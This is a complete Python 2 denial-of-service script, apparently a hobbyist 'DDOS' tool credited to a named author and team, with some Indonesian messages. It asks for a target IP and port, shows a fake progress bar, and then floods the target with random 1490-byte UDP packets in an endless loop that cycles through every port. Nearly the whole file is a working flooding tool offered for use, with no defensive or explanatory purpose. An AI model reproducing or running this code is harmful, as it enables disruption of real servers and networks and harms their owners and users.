import sys
import os
import time
import socket
import string
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
raw_input("Press [ENTER] to Continue")
print ("Please Wait...")
time.sleep(5)
print " "
print ("\33[0;36mDONE!!")
time.sleep(2)
os.system("clear")
print("""\033[1;31m  \033[92m
================ [ C.E.S DDOS ] =================                        
Author  = Tn.Xzack7
Team    = Cyber Error System
Youtube = https://youtube.com/Tn.Xzack7

================================================
""")
print(" ")
ip = raw_input("\33[36;1m[+] \033[91mIP \033[91mTarget \33[1;33m>>> \33[0;32m")
port = input("\33[36;1m[+] \033[91mPORT [80/8080] \33[1;33m>>> \33[0;32m")

os.system("clear")
print(" Sabar njeng masih loading..!! ")
time.sleep(2)
print(" [======>                               ]15% ") 
time.sleep(3)
print(" [=============>                        ]25% ") 
time.sleep(3)
print(" [====================>                 ]50% ") 
time.sleep(3)
print(" [=============================>        ]75% ") 
time.sleep(3)
print(" [=====================================>]100% ") 
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\33[36;1mMengirim Packet \33[31;1m%s   \33[36;1mke \33[31;1m%s   \33[36;1mTrought \33[36;1mPort \33[31;1m%s"%(sent,ip,port)
     if port == 65534:
       port = 1
       
       
       
       
       
       
       